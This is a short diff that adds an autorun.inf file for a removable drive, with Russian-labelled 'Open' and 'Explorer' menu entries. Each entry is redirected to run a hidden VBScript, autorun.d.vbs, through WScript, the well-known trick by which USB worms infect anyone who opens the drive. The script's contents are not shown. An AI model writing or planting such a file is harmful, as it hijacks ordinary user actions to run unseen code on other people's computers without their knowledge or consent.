@@ -1,0 +1,14 @@
+[autorun]
+open=
+shell\open=Открыть
+shell\open\Command=WScript .\autorun.d.vbs
+shell\open\Default=1
+shell\explore=Проводник
+shell\explore\Command=WScript .\autorun.d.vbs
+
+
+
+
+
+
+
